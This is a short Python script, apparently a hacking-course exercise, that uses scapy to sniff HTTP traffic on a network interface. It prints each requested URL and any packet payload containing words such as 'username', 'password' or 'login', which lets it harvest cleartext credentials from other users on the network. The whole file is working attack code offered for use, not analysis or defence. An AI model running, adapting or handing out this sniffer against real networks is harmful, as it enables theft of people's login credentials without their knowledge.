#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/23/2018

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=main_process_packet)


def main_process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
        print "[+] HTTP Request: >> "+url
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if "username" in load:
                keywords = ["username","user","password","pass","email","login"]
                for keyword in keywords:
                    if keyword in load:
                        print "\n\n Possible username/password: >> "+load
                        break


sniff("eth0")
